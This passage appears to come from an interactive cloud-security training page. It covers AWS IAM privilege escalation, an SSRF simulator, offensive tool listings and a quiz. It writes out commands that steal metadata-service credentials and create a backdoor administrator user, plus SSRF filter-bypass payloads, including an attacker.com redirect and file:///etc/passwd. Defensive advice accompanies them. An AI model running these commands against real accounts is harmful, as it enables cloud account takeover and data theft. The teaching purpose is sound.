                        <div class="code-block"><code>aws ec2 run-instances \<br>  --image-id ami-12345678 \<br>  --instance-type t2.micro \<br>  --iam-instance-profile Name=AdminRole<br><br># SSH into instance and steal creds:<br>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole</code></div>
                        <button onclick="activatePrivLevel(3)">Attempt Escalation ‚Üí</button>
                    </div>

                    <div class="priv-level" id="privLevel3">
                        <h3>Level 3: Create New Policy Version</h3>
                        <p><strong>Required Permissions:</strong> iam:CreatePolicyVersion</p>
                        <p><strong>Technique:</strong> Modify existing policy by creating new version with elevated permissions and setting it as default.</p>
                        <div class="code-block"><code>aws iam create-policy-version \<br>  --policy-arn arn:aws:iam::ACCOUNT:policy/LimitedPolicy \<br>  --policy-document file://admin-policy.json \<br>  --set-as-default<br><br># admin-policy.json:<br>{<br>  "Version": "2012-10-17",<br>  "Statement": [{<br>    "Effect": "Allow",<br>    "Action": "*",<br>    "Resource": "*"<br>  }]<br>}</code></div>
                        <button onclick="activatePrivLevel(4)">Attempt Escalation ‚Üí</button>
                    </div>

                    <div class="priv-level" id="privLevel4">
                        <h3>Level 4: Add User to Admin Group</h3>
                        <p><strong>Required Permissions:</strong> iam:AddUserToGroup</p>
                        <p><strong>Technique:</strong> Add current user to existing admin group to inherit administrative permissions.</p>
                        <div class="code-block"><code>aws iam list-groups<br>aws iam get-group --group-name Administrators<br><br>aws iam add-user-to-group \<br>  --user-name compromised-user \<br>  --group-name Administrators<br><br># Verify new permissions:<br>aws iam list-attached-group-policies --group-name Administrators</code></div>
                        <button onclick="activatePrivLevel(5)">Attempt Escalation ‚Üí</button>
                    </div>

                    <div class="priv-level" id="privLevel5">
                        <h3>Level 5: Full Administrator Access</h3>
                        <p><strong>Achieved Permissions:</strong> *:* (Full AWS account control)</p>
                        <p><strong>Impact:</strong> Complete account takeover - can create users, access all data, launch resources, modify billing</p>
                        <div class="code-block"><code># Verify admin access:<br>aws iam list-users<br>aws s3 ls<br>aws ec2 describe-instances --region us-east-1<br><br># Create backdoor user:<br>aws iam create-user --user-name backdoor<br>aws iam attach-user-policy --user-name backdoor \<br>  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess<br>aws iam create-access-key --user-name backdoor</code></div>
                        <div class="success" style="margin-top: 15px; padding: 15px; background: rgba(16, 185, 129, 0.2); border-radius: 8px;">
                            ‚úì PRIVILEGE ESCALATION COMPLETE - Administrator access achieved!
                        </div>
                    </div>
                </div>

                <h3>Additional Privilege Escalation Vectors</h3>
                <div class="grid">
                    <div class="tool-card">
                        <div class="tool-name">iam:AttachUserPolicy</div>
                        <p>Attach administrator policy directly to user account.</p>
                        <div class="code-block"><code>aws iam attach-user-policy \<br>  --user-name current-user \<br>  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">iam:PutUserPolicy</div>
                        <p>Create inline policy with elevated permissions.</p>
                        <div class="code-block"><code>aws iam put-user-policy \<br>  --user-name current-user \<br>  --policy-name EscPolicy \<br>  --policy-document file://admin.json</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">iam:UpdateAssumeRolePolicy</div>
                        <p>Modify role trust policy to allow assuming privileged role.</p>
                        <div class="code-block"><code>aws iam update-assume-role-policy \<br>  --role-name AdminRole \<br>  --policy-document file://trust.json</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">lambda:CreateFunction + iam:PassRole</div>
                        <p>Create Lambda with privileged role and execute code.</p>
                        <div class="code-block"><code>aws lambda create-function \<br>  --function-name priv-esc \<br>  --role arn:aws:iam::ACCOUNT:role/AdminRole \<br>  --handler index.handler --zip-file fileb://func.zip</code></div>
                    </div>
                </div>

                <div class="danger-box">
                    <strong>üî¥ Defense Strategies:</strong>
                    <ul>
                        <li><strong>Principle of Least Privilege:</strong> Grant minimum permissions required for job function</li>
                        <li><strong>Permission Boundaries:</strong> Set maximum permissions for IAM entities</li>
                        <li><strong>Service Control Policies (SCPs):</strong> Restrict dangerous actions at organization level</li>
                        <li><strong>CloudTrail Monitoring:</strong> Alert on suspicious IAM modifications</li>
                        <li><strong>Regular Audits:</strong> Use IAM Access Analyzer and AWS Config to detect overprivileged roles</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- SSRF Attack Demo Section -->
        <div id="ssrf" class="section">
            <div class="card">
                <h2>üéØ SSRF Attack Demonstration</h2>
                <p>Server-Side Request Forgery (SSRF) allows attackers to make requests from the vulnerable server, often to access internal resources like the EC2 metadata service.</p>

                <h3>SSRF Attack Chain</h3>
                <div class="attack-chain">
                    <div class="attack-step">
                        <div class="step-number">1</div>
                        <div>
                            <strong>Identify SSRF Vulnerability</strong><br>
                            Find user input that triggers server-side HTTP requests (URL parameters, webhooks, image fetching, PDF generation, etc.)
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">2</div>
                        <div>
                            <strong>Test Internal Network Access</strong><br>
                            Attempt to access internal IP ranges, localhost, and cloud metadata endpoints
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">3</div>
                        <div>
                            <strong>Access Metadata Service</strong><br>
                            Query 169.254.169.254 to retrieve instance metadata and IAM credentials
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">4</div>
                        <div>
                            <strong>Extract IAM Credentials</strong><br>
                            Steal temporary access keys from security-credentials endpoint
                        </div>
                    </div>
                    <div class="arrow">‚¨áÔ∏è</div>
                    <div class="attack-step">
                        <div class="step-number">5</div>
                        <div>
                            <strong>Use Credentials for AWS Access</strong><br>
                            Configure AWS CLI with stolen credentials and access cloud resources
                        </div>
                    </div>
                </div>

                <h3>Interactive SSRF Simulator</h3>
                <div class="simulator">
                    <p><strong>Scenario:</strong> A web application has a "Fetch URL" feature that retrieves external content. You suspect it's vulnerable to SSRF.</p>

                    <label for="ssrfUrl">Enter URL to fetch (vulnerable parameter):</label>
                    <input type="text" id="ssrfUrl" value="http://169.254.169.254/latest/meta-data/" placeholder="http://example.com">

                    <div class="grid" style="margin: 15px 0;">
                        <button onclick="testSSRF('http://169.254.169.254/latest/meta-data/')">Test Metadata Root</button>
                        <button onclick="testSSRF('http://169.254.169.254/latest/meta-data/iam/security-credentials/')">Get IAM Role Name</button>
                        <button onclick="testSSRF('http://169.254.169.254/latest/meta-data/iam/security-credentials/WebServerRole')">Steal Credentials</button>
                        <button onclick="testSSRF('http://169.254.169.254/latest/user-data')">Get User Data</button>
                    </div>

                    <button onclick="executeSSRF()">üöÄ Execute SSRF Request</button>
                    <button onclick="clearSSRFOutput()">Clear Output</button>

                    <div class="terminal" id="ssrfOutput">
                        <div class="terminal-line"><span class="prompt">$</span> SSRF testing environment ready...</div>
                    </div>
                </div>

                <h3>SSRF Bypass Techniques</h3>
                <div class="grid">
                    <div class="tool-card">
                        <div class="tool-name">IP Encoding</div>
                        <p>Bypass blacklists using alternative IP representations.</p>
                        <div class="code-block"><code>http://169.254.169.254/ (standard)<br>http://2852039166/ (decimal)<br>http://0xa9.0xfe.0xa9.0xfe/ (hex)<br>http://0251.0376.0251.0376/ (octal)</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">DNS Rebinding</div>
                        <p>Use DNS that resolves to internal IP after initial validation.</p>
                        <div class="code-block"><code>http://metadata.nicob.net<br>http://169.254.169.254.nip.io</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">URL Redirects</div>
                        <p>Host external page that redirects to metadata service.</p>
                        <div class="code-block"><code>http://attacker.com/redirect.php<br># Redirects to 169.254.169.254</code></div>
                    </div>
                    <div class="tool-card">
                        <div class="tool-name">Protocol Smuggling</div>
                        <p>Use alternative protocols or URL parsers.</p>
                        <div class="code-block"><code>file:///etc/passwd<br>gopher://169.254.169.254:80/...<br>dict://169.254.169.254:80/</code></div>
                    </div>
                </div>

                <div class="warning-box">
                    <strong>‚ö†Ô∏è SSRF Defense Mechanisms:</strong>
                    <ul>
                        <li><strong>Whitelist Allowed Domains:</strong> Only permit requests to known safe destinations</li>
                        <li><strong>Block Private IP Ranges:</strong> Deny RFC1918, link-local (169.254.0.0/16), and localhost</li>
                        <li><strong>Disable Redirects:</strong> Prevent HTTP redirects that bypass filters</li>
                        <li><strong>Use IMDSv2:</strong> Require session tokens for metadata service access</li>
                        <li><strong>Network Segmentation:</strong> Isolate web servers from sensitive internal resources</li>
                        <li><strong>Egress Filtering:</strong> Control outbound connections from application servers</li>
                    </ul>
                </div>

                <h3>Real-World SSRF Case: Capital One Breach (2019)</h3>
                <div class="danger-box">
                    <strong>Attack Summary:</strong>
                    <p>Attacker exploited SSRF in web application firewall (WAF) to access EC2 metadata service, stealing IAM credentials. Used credentials to access S3 buckets containing 100+ million customer records.</p>

                    <strong>Attack Steps:</strong>
                    <ol>
                        <li>Discovered SSRF in misconfigured WAF</li>
                        <li>Accessed http://169.254.169.254/latest/meta-data/iam/security-credentials/</li>
                        <li>Retrieved IAM role temporary credentials</li>
                        <li>Used credentials to list S3 buckets</li>
                        <li>Exfiltrated sensitive customer data from multiple buckets</li>
                    </ol>

                    <strong>Lessons Learned:</strong>
                    <ul>
                        <li>Implement strict SSRF protections on all user-controlled URLs</li>
                        <li>Use IMDSv2 to prevent simple SSRF attacks</li>
                        <li>Apply principle of least privilege to IAM roles</li>
                        <li>Monitor for unusual metadata service access patterns</li>
                        <li>Encrypt sensitive data at rest in S3</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Tools Section -->
        <div id="tools" class="section">
            <div class="card">
                <h2>üõ†Ô∏è Cloud Security Testing Tools</h2>
                <p>Essential tools for AWS penetration testing and security assessment.</p>

                <h3>Offensive Security Tools</h3>
                <div class="grid">
                    <div class="tool-card">
                        <div class="tool-name">PACU</div>
                        <p><strong>By Rhino Security Labs</strong></p>
                        <p>AWS exploitation framework with 40+ modules for enumeration, privilege escalation, persistence, and data exfiltration.</p>
                        <div class="code-block"><code>git clone https://github.com/RhinoSecurityLabs/pacu<br>cd pacu && bash install.sh<br>python3 pacu.py<br><br># Example usage:<br>run iam__enum_permissions<br>run iam__privesc_scan</code></div>
                        <p><strong>Key Modules:</strong> iam__enum_users, ec2__enum, s3__bucket_finder, lambda__backdoor_function</p>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">CloudGOAT 2</div>
                        <p><strong>By Rhino Security Labs</strong></p>
                        <p>Vulnerable-by-design AWS environment for learning cloud security. Multiple scenarios covering IAM, EC2, Lambda, and more.</p>
                        <div class="code-block"><code>git clone https://github.com/RhinoSecurityLabs/cloudgoat<br>cd cloudgoat<br>pip3 install -r requirements.txt<br>python3 cloudgoat.py config profile<br>python3 cloudgoat.py create iam_privesc_by_rollback</code></div>
                        <p><strong>Scenarios:</strong> IAM privilege escalation, Lambda privilege escalation, EC2 SSRF, CodeBuild secrets</p>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">AWS-Pwn</div>
                        <p><strong>Collection of AWS Exploitation Tools</strong></p>
                        <p>Suite of tools for AWS credential discovery, enumeration, and exploitation from compromised environments.</p>
                        <div class="code-block"><code>git clone https://github.com/dagrz/aws_pwn<br><br># Enumerate IAM permissions:<br>python3 aws_pwn.py --enumerate<br><br># Search for credentials:<br>python3 aws_pwn.py --find-creds</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">WeirdAAL</div>
                        <p><strong>AWS Attack Library</strong></p>
                        <p>Python library for interacting with AWS services for penetration testing and red team operations.</p>
                        <div class="code-block"><code>git clone https://github.com/carnal0wnage/weirdAAL<br>python3 weirdAAL.py -m recon_all -t target</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Prowler</div>
                        <p><strong>AWS Security Assessment</strong></p>
                        <p>Security best practices assessment, auditing, and hardening tool following CIS benchmarks.</p>
                        <div class="code-block"><code>git clone https://github.com/prowler-cloud/prowler<br>cd prowler<br>./prowler -M csv html<br><br># Specific checks:<br>./prowler -g cislevel2</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">ScoutSuite</div>
                        <p><strong>Multi-Cloud Security Auditing</strong></p>
                        <p>Automated security assessment for AWS, Azure, GCP with detailed HTML reports.</p>
                        <div class="code-block"><code>pip install scoutsuite<br>scout aws --profile target<br><br># Multi-cloud scan:<br>scout all --profile aws_profile</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">S3Scanner</div>
                        <p><strong>S3 Bucket Discovery & Enumeration</strong></p>
                        <p>Fast tool to find open S3 buckets and dump contents.</p>
                        <div class="code-block"><code>pip install s3scanner<br>s3scanner scan --buckets-file buckets.txt<br>s3scanner dump --bucket target-bucket</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">BucketKicker</div>
                        <p><strong>S3 Brute Force Tool</strong></p>
                        <p>Dictionary-based S3 bucket discovery with permission testing.</p>
                        <div class="code-block"><code>git clone https://github.com/craighays/bucketkicker<br>python BucketKicker.py wordlist.txt</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">CloudMapper</div>
                        <p><strong>AWS Environment Visualization</strong></p>
                        <p>Creates network diagrams of AWS environments for security analysis.</p>
                        <div class="code-block"><code>git clone https://github.com/duo-labs/cloudmapper<br>python cloudmapper.py configure<br>python cloudmapper.py collect<br>python cloudmapper.py prepare<br>python cloudmapper.py webserver</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">enumerate-iam</div>
                        <p><strong>IAM Permission Enumeration</strong></p>
                        <p>Brute force AWS IAM permissions to understand what actions credentials can perform.</p>
                        <div class="code-block"><code>git clone https://github.com/andresriancho/enumerate-iam<br>python enumerate-iam.py --access-key AKIA... --secret-key ...</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Terraform AWS Pwn</div>
                        <p><strong>Vulnerable Infrastructure Templates</strong></p>
                        <p>Intentionally vulnerable Terraform configurations for practicing cloud exploitation.</p>
                        <div class="code-block"><code>git clone https://github.com/SecurityFTW/terraform-aws-pwn<br>terraform init<br>terraform apply</code></div>
                    </div>

                    <div class="tool-card">
                        <div class="tool-name">Cloud_Enum</div>
                        <p><strong>Multi-Cloud Asset Discovery</strong></p>
                        <p>Enumerate public resources in AWS, Azure, and GCP.</p>
                        <div class="code-block"><code>git clone https://github.com/initstring/cloud_enum<br>python3 cloud_enum.py -k company-name</code></div>
                    </div>
                </div>

                <h3>IAM Policy Analyzer</h3>
                <div class="simulator">
                    <label for="policyInput">Enter IAM Policy JSON to analyze:</label>
                    <textarea id="policyInput" placeholder='{"Version": "2012-10-17", "Statement": [...]}'>{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}</textarea>
                    <button onclick="analyzePolicy()">üîç Analyze Policy for Security Issues</button>

                    <div class="terminal" id="policyOutput">
                        <div class="terminal-line"><span class="prompt">$</span> Policy analysis results will appear here...</div>
                    </div>
                </div>

                <div class="info-box">
                    <strong>üí° Tool Selection Guide:</strong>
                    <ul>
                        <li><strong>Initial Reconnaissance:</strong> Prowler, ScoutSuite, Cloud_Enum</li>
                        <li><strong>Credential Discovery:</strong> truffleHog, git-secrets, AWS-Pwn</li>
                        <li><strong>Permission Enumeration:</strong> enumerate-iam, PACU, WeirdAAL</li>
                        <li><strong>Privilege Escalation:</strong> PACU, CloudGOAT 2</li>
                        <li><strong>S3 Bucket Hunting:</strong> S3Scanner, BucketKicker, Cloud_Enum</li>
                        <li><strong>Learning & Practice:</strong> CloudGOAT 2, Terraform AWS Pwn</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- Quiz Section -->
        <div id="quiz" class="section">
            <div class="card">
                <h2>üìù Cloud Security Quiz</h2>
                <p>Test your knowledge of cloud security and hacking techniques. Complete all questions to earn 80 XP!</p>

                <div class="quiz-container">
                    <div class="question">
                        <h3>Question 1: Which tool is specifically designed for AWS exploitation and includes 40+ attack modules?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q1" value="a"> a) Metasploit
                            </label>
                            <label class="option">
                                <input type="radio" name="q1" value="b"> b) PACU
                            </label>
                            <label class="option">
                                <input type="radio" name="q1" value="c"> c) Nmap
                            </label>
                            <label class="option">
                                <input type="radio" name="q1" value="d"> d) Burp Suite
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 2: What is the IP address of the AWS EC2 metadata service?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q2" value="a"> a) 192.168.1.1
                            </label>
                            <label class="option">
                                <input type="radio" name="q2" value="b"> b) 10.0.0.1
                            </label>
                            <label class="option">
                                <input type="radio" name="q2" value="c"> c) 169.254.169.254
                            </label>
                            <label class="option">
                                <input type="radio" name="q2" value="d"> d) 172.16.0.1
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 3: Which Kubernetes component stores all cluster secrets and configuration data?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q3" value="a"> a) Kubelet
                            </label>
                            <label class="option">
                                <input type="radio" name="q3" value="b"> b) kube-proxy
                            </label>
                            <label class="option">
                                <input type="radio" name="q3" value="c"> c) etcd
                            </label>
                            <label class="option">
                                <input type="radio" name="q3" value="d"> d) API Server
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 4: Which container scanning tool is developed by Aqua Security?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q4" value="a"> a) Clair
                            </label>
                            <label class="option">
                                <input type="radio" name="q4" value="b"> b) Trivy
                            </label>
                            <label class="option">
                                <input type="radio" name="q4" value="c"> c) Dagda
                            </label>
                            <label class="option">
                                <input type="radio" name="q4" value="d"> d) Sysdig
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 5: What IAM permissions are required to escalate privileges by launching an EC2 instance with a privileged role?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q5" value="a"> a) ec2:StartInstances only
                            </label>
                            <label class="option">
                                <input type="radio" name="q5" value="b"> b) iam:PassRole + ec2:RunInstances
                            </label>
                            <label class="option">
                                <input type="radio" name="q5" value="c"> c) iam:CreateRole only
                            </label>
                            <label class="option">
                                <input type="radio" name="q5" value="d"> d) ec2:DescribeInstances only
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 6: Which AWS feature requires a session token to mitigate SSRF attacks against the metadata service?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q6" value="a"> a) IMDSv1
                            </label>
                            <label class="option">
                                <input type="radio" name="q6" value="b"> b) IMDSv2
                            </label>
                            <label class="option">
                                <input type="radio" name="q6" value="c"> c) EC2-Classic
                            </label>
                            <label class="option">
                                <input type="radio" name="q6" value="d"> d) VPC Endpoints
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 7: What is the default port for the Kubernetes API server?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q7" value="a"> a) 8080
                            </label>
                            <label class="option">
                                <input type="radio" name="q7" value="b"> b) 10250
                            </label>
                            <label class="option">
                                <input type="radio" name="q7" value="c"> c) 6443
                            </label>
                            <label class="option">
                                <input type="radio" name="q7" value="d"> d) 2379
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 8: Which tool can be used to brute force S3 bucket names?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q8" value="a"> a) Hashcat
                            </label>
                            <label class="option">
                                <input type="radio" name="q8" value="b"> b) John the Ripper
                            </label>
                            <label class="option">
                                <input type="radio" name="q8" value="c"> c) BucketKicker
                            </label>
                            <label class="option">
                                <input type="radio" name="q8" value="d"> d) Hydra
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 9: CloudGOAT 2 is used for:</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q9" value="a"> a) Cloud storage encryption
                            </label>
                            <label class="option">
                                <input type="radio" name="q9" value="b"> b) Learning cloud security through vulnerable-by-design scenarios
                            </label>
                            <label class="option">
                                <input type="radio" name="q9" value="c"> c) Cloud backup automation
                            </label>
                            <label class="option">
                                <input type="radio" name="q9" value="d"> d) Cloud cost optimization
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 10: Which IAM permission allows an attacker to modify an existing policy by creating a new version?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q10" value="a"> a) iam:UpdatePolicy
                            </label>
                            <label class="option">
                                <input type="radio" name="q10" value="b"> b) iam:CreatePolicyVersion
                            </label>
                            <label class="option">
                                <input type="radio" name="q10" value="c"> c) iam:ModifyPolicy
                            </label>
                            <label class="option">
                                <input type="radio" name="q10" value="d"> d) iam:EditPolicy
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 11: What type of attack was used in the Capital One breach to access the metadata service?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q11" value="a"> a) SQL Injection
                            </label>
                            <label class="option">
                                <input type="radio" name="q11" value="b"> b) Cross-Site Scripting (XSS)
                            </label>
                            <label class="option">
                                <input type="radio" name="q11" value="c"> c) Server-Side Request Forgery (SSRF)
                            </label>
                            <label class="option">
                                <input type="radio" name="q11" value="d"> d) Remote Code Execution (RCE)
                            </label>
                        </div>
                    </div>

                    <div class="question">
                        <h3>Question 12: In the Cloud Shared Responsibility Model, who is responsible for IAM configuration?</h3>
                        <div class="options">
                            <label class="option">
                                <input type="radio" name="q12" value="a"> a) Cloud provider only
                            </label>
                            <label class="option">
                                <input type="radio" name="q12" value="b"> b) Customer only
                            </label>
                            <label class="option">
                                <input type="radio" name="q12" value="c"> c) Shared between provider and customer
                            </label>
                            <label class="option">
                                <input type="radio" name="q12" value="d"> d) Third-party security vendor
                            </label>
                        </div>
                    </div>

                    <button onclick="submitQuiz()" style="margin-top: 20px; font-size: 1.1em;">Submit Quiz</button>

                    <div id="quizResult" class="result" style="display: none;">
                        <h3>Quiz Results</h3>
                        <div class="score" id="scoreDisplay"></div>
                        <div id="resultMessage"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Progress tracking
        const completedSections = new Set();
        const quizCompleted = { status: false };

        function updateProgress() {
            const totalSections = 8;
            const completed = completedSections.size + (quizCompleted.status ? 1 : 0);
            const percentage = Math.round((completed / totalSections) * 100);
            const xp = Math.round((completed / totalSections) * 80);

            document.getElementById('progressBar').style.width = percentage + '%';
            document.getElementById('progressText').textContent = `Progress: ${percentage}% - ${xp} XP / 80 XP`;
        }

        function showSection(sectionId) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));

            document.getElementById(sectionId).classList.add('active');
            event.target.classList.add('active');

            if (sectionId !== 'overview' && sectionId !== 'quiz') {
                completedSections.add(sectionId);
                updateProgress();
            }
        }

        // Container scanning simulator
        const vulnerabilityDatabase = {
            'nginx:1.19': [
                { id: 'CVE-2021-23017', severity: 'HIGH', description: 'Resolver off-by-one overflow' },
                { id: 'CVE-2020-11724', severity: 'MEDIUM', description: 'Improper handling of exceptional conditions' }
            ],
            'node:14': [
                { id: 'CVE-2021-22918', severity: 'HIGH', description: 'DNS rebinding in --inspect' },
                { id: 'CVE-2021-22930', severity: 'CRITICAL', description: 'Use after free attack' }
            ],
            'ubuntu:18.04': [
                { id: 'CVE-2021-3711', severity: 'HIGH', description: 'OpenSSL buffer overflow' },
                { id: 'CVE-2021-3712', severity: 'MEDIUM', description: 'OpenSSL read buffer overflow' }
            ],
            'alpine:3.12': [
                { id: 'CVE-2021-36159', severity: 'LOW', description: 'libfetch buffer overflow' }
            ]
        };

        function scanImage() {
            const image = document.getElementById('imageInput').value.trim();
            const output = document.getElementById('scanOutput');

            if (!image) {
                output.innerHTML = '<div class="error">Error: Please enter an image name</div>';
                return;
            }

            output.innerHTML = `<div class="terminal-line"><span class="prompt">$</span> trivy image ${image}</div>
<div class="terminal-line" style="color: #00aaff;">Downloading vulnerability database...</div>
<div class="terminal-line" style="color: #00aaff;">Scanning image layers...</div>
<div class="terminal-line" style="color: #00aaff;">Analyzing packages...</div>
<div class="terminal-line"></div>`;

            setTimeout(() => {
                const normalizedImage = image.toLowerCase().split(':')[0];
                const vulnerabilities = Object.keys(vulnerabilityDatabase).find(k => k.startsWith(normalizedImage));

                if (vulnerabilities) {
                    const vulns = vulnerabilityDatabase[vulnerabilities];
                    let scanResults = `<div class="terminal-line" style="color: #ffaa00;">Found ${vulns.length} vulnerabilities in ${image}</div>
<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00ff00;">VULNERABILITY REPORT</div>
<div class="terminal-line">‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê</div>`;

                    vulns.forEach(vuln => {
                        const color = vuln.severity === 'CRITICAL' ? '#ff0000' :
                                    vuln.severity === 'HIGH' ? '#ff5500' :
                                    vuln.severity === 'MEDIUM' ? '#ffaa00' : '#ffff00';
                        scanResults += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: ${color};">[${vuln.severity}] ${vuln.id}</div>
<div class="terminal-line">Description: ${vuln.description}</div>`;
                    });

                    scanResults += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00aaff;">Scan completed. Review vulnerabilities before deployment.</div>`;
                    output.innerHTML += scanResults;
                } else {
                    output.innerHTML += `<div class="terminal-line" style="color: #00ff00;">No known vulnerabilities found in ${image}</div>
<div class="terminal-line" style="color: #00ff00;">Image appears to be secure based on current CVE database.</div>`;
                }
            }, 2000);
        }

        function clearScanResults() {
            document.getElementById('scanOutput').innerHTML = '<div class="terminal-line"><span class="prompt">$</span> Waiting for scan command...</div>';
        }

        // Kubernetes progress tracking
        function updateK8sProgress() {
            const checkboxes = document.querySelectorAll('#k8s input[type="checkbox"]');
            const checked = Array.from(checkboxes).filter(cb => cb.checked).length;
            const total = checkboxes.length;

            document.getElementById('k8sProgress').innerHTML = `<strong>Enumeration Progress:</strong> ${checked}/${total} checks completed`;

            if (checked === total) {
                document.getElementById('k8sProgress').innerHTML += '<br><span style="color: var(--success);">‚úì Kubernetes enumeration complete!</span>';
            }
        }

        // S3 bucket discovery simulator
        function discoverBuckets() {
            const company = document.getElementById('companyName').value.trim();
            const output = document.getElementById('s3Output');

            if (!company) {
                output.innerHTML = '<div class="error">Error: Please enter a company name</div>';
                return;
            }

            output.innerHTML = `<div class="terminal-line"><span class="prompt">$</span> s3scanner scan --company "${company}"</div>
<div class="terminal-line" style="color: #00aaff;">Generating bucket name variations...</div>
<div class="terminal-line" style="color: #00aaff;">Testing bucket existence...</div>`;

            setTimeout(() => {
                const buckets = [
                    `${company}-backups`,
                    `${company}-data`,
                    `${company}-logs`,
                    `${company.replace('-', '')}-prod`,
                    `www.${company}.com`,
                    `${company}-assets`
                ];

                let results = '<div class="terminal-line"></div><div class="terminal-line" style="color: #00ff00;">DISCOVERED BUCKETS:</div><div class="terminal-line">‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê</div>';

                buckets.forEach((bucket, i) => {
                    const exists = Math.random() > 0.6;
                    if (exists) {
                        const status = Math.random() > 0.7 ? 'PUBLIC' : 'PRIVATE';
                        const color = status === 'PUBLIC' ? '#ff0000' : '#ffaa00';
                        results += `<div class="terminal-line" style="color: ${color};">[${status}] ${bucket}</div>`;
                    }
                });

                results += '<div class="terminal-line"></div><div class="terminal-line" style="color: #00aaff;">Scan complete. Use test access to check permissions.</div>';
                output.innerHTML += results;
            }, 1500);
        }

        function testBucketAccess() {
            const output = document.getElementById('s3Output');

            output.innerHTML = `<div class="terminal-line"><span class="prompt">$</span> aws s3 ls s3://company-backups --no-sign-request</div>`;

            setTimeout(() => {
                const hasAccess = Math.random() > 0.5;

                if (hasAccess) {
                    output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #00ff00;">2024-01-15 10:23:45    1048576 database_backup.sql</div>
<div class="terminal-line" style="color: #00ff00;">2024-01-14 08:15:22    2097152 customer_data.csv</div>
<div class="terminal-line" style="color: #00ff00;">2024-01-13 15:42:11     524288 credentials.txt</div>
<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ff0000;">‚ö† WARNING: Bucket allows anonymous READ access!</div>
<div class="terminal-line" style="color: #ff0000;">‚ö† Sensitive files may be exposed!</div>`;
                } else {
                    output.innerHTML += `<div class="terminal-line"></div>
<div class="terminal-line" style="color: #ffaa00;">An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</div>
<div class="terminal-line" style="color: #00ff00;">‚úì Bucket is properly secured with authentication required.</div>`;
                }
            }, 1000);
        }

        // Metadata service simulator
        const metadataResponses = {
            '/': `ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-id
instance-type
local-hostname
local-ipv4
public-hostname
public-ipv4
public-keys/
security-groups`,
            '/instance-id': 'i-0abcd1234efgh5678',
            '/iam/info': `{
  "Code": "Success",
  "LastUpdated": "2024-01-15T12:34:56Z",
  "InstanceProfileArn": "arn:aws:iam::123456789012:instance-profile/WebServerRole",
